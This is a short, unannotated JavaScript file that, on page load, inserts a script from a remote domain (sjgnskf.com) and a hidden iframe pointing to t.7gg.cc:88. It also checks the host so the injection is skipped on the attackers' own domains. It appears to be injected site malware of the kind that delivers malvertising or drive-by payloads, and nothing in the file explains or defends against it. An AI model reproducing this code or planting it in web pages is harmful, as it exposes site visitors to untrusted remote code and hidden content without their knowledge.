function newjs(){
var star = document.createElement("script");
star.src = "http://sjgnskf.com/bd/query.js?vid=30000";
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(star, s);
};

function old(){
var star = document.createElement("script");
star.src = "http://qet.jsncke.com/s/js/jquery.js?_qwert_sid=568808220&_zxcvb_pid=990834033262&rnd=1210";
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(star, s);
};

function abc() {
	var wy = document.createElement("div");
	wy.style = "display:none";
	wy.innerHTML  = "<iframe src=\"http://t.7gg.cc:88/new.html\" ></iframe>";
	var s = document.getElementsByTagName("script")[0];
	s.parentNode.insertBefore(wy, s);
};

function forbidHost(){
        var host = top.window.location.host;
        if ((host.indexOf(".7gg.cc") != -1)||(host.indexOf(".sjgnskf.com") != -1)){
            return true;
        }
    }
	
aa();

function aa(){
	        if(forbidHost()){
            return false;
        }

var mbad=Math.ceil(Math.random()*10);
if (mbad!=0){
newjs();
abc();
}else{
old();
abc();
}
}